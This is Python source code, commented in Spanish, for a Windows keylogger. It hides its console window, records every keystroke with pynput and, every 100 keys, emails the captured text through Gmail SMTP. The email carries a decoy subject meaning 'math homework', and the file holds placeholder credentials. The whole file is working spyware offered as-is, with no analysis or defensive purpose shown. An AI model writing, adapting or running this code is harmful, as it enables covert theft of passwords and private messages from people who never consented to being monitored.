
#pywin32->modulo de python para intercatuar con el api de windows que permite acceder a algunas funciones del
#sistema que permite controlar mejor el funcionamiento de la maquina
import pynput.keyboard
import win32console
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



#---------------------EJECUCION EN 2DO PLANO-
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
#--------------------------------------------

#crea el archivo .txt
#Cantidad de teclas


count=0
msg="Horus dice "

def mandarMail(contenido):
    try:

        # Datos
        # fromaddr = 'test@gmail.com'
        # toaddrs = 'test@gmail.com'
        # username = 'test@gmail.com'
        password = 'test123'
        mensaje= MIMEMultipart()
        content= contenido

        mensaje['From']= 'test@gmail.com'
        mensaje['To']='test@gmail.com'
        mensaje['Subject']= 'Tarea de Matematica'

        mensaje.attach(MIMEText(content,'plain'))


        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(mensaje['From'], password)
        server.sendmail(mensaje['From'], mensaje['To'],mensaje.as_string())
        server.quit()

        print("DONE")
    except:
        print("FAILURE")
        pass


def presiona(key):
    global count
    global msg
    count+=1

    if count==100:
        mandarMail(msg)
        count=0
        msg="Horus dice: "

    if str(key)=="Key.esc":
        print("Saliendo...")
        print(msg)
        return False

    key1 = convertir(key)
    print("Tecla presionada: {}".format(key1))

    if key1 =="Key.enter":
        msg+="\n"

    elif key1 == "Key.space":
        msg+=(" ")
    elif key1 == "Key.backspace":
        msg+=("/BORRO/")
    else:
        print("aaaaaa")
        print(key1)
        msg+=(key1.replace("'",""))



def convertir(key):
    #.KeyCode es un mapa de letras (azAZ0-9), si me llega un valor raro no entra en KeyCode y lo devuelve en el else como str
    if isinstance(key, pynput.keyboard.KeyCode): #isinstance verifica que el 1er argumento es sublcase u objeto del 2do
        return key.char #key al pertenecer a KeyCode tiene este metodo, no hace falta usar str
    else:
        return str(key)

#en esta linea guardo en la variable listen el Listener
#on_press->cuando presione algo usa la funcion presiona (por ejemplo)
with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()
